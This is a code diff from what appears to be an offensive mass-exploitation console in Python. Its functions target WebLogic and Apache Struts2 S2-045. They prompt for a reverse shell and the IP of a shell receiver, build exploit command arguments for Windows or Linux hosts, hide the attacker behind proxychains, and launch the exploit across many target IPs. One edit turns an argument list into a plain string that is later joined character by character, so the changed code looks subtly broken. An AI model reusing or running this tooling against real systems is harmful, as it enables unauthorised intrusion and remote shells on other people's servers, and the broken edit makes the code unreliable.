@@ -178,11 +178,7 @@ def weblogic():
             colors.BLUE +
             '[?] Windows or Linux? [w/l] ' +
             colors.END))
-    if str(
-        input(
-            colors.BLUE +
-            '[?] Do you need a reverse shell? [y/n] ' +
-            colors.END)).strip().lower() == 'y':
+    if str(input(colors.BLUE + '[?] Do you need a reverse shell? [y/n] ' + colors.END)).strip().lower() == 'y':
         shellServer = input(
             colors.BLUE +
             '[?] What\'s the IP of shell receiver? ' +
@@ -207,13 +203,11 @@ def weblogic():
                   colors.END)).strip(
         )
         if os_type.lower() == 'w':
-            custom_args = '-P {} --silent -T exploit -os win'.format(
-                server_port).split()
-            custom_args += ['-c', cmd]
+            custom_args = '-P {} --silent -T exploit -c {} -os win'.format(
+                server_port, cmd)
         elif os_type.lower() == 'l':
-            custom_args = '-P {} --silent -T exploit -os linux'.format(
-                server_port).split()
-            custom_args += ['-c', cmd]
+            custom_args = '-P {} --silent -T exploit -c {} -os linux'.format(
+                server_port, cmd)
         else:
             return
 
@@ -255,8 +249,7 @@ def s2_045():
         colors.BLUE +
         '[*] Your exploit will be executed like\n' +
         colors.END,
-        'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(exec_path),
-        ' '.join(custom_args))
+        'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(exec_path), ' '.join(custom_args))
     # start scanner
     scanner_args = (exploit, work_path, exec_path, custom_args, jobs)
     scanner(scanner_args)
@@ -266,11 +259,7 @@ def attack():
     global proxy_conf
     global proxy
     global scanner_args
-    if str(
-        input(
-            colors.CYAN +
-            '[?] Do you wish to use proxychains? [y/n] ' +
-            colors.END)).strip().lower() == 'y':
+    if str(input(colors.CYAN + '[?] Do you wish to use proxychains? [y/n] ' + colors.END)).strip().lower() == 'y':
         proxy = True
     else:
         proxy = False
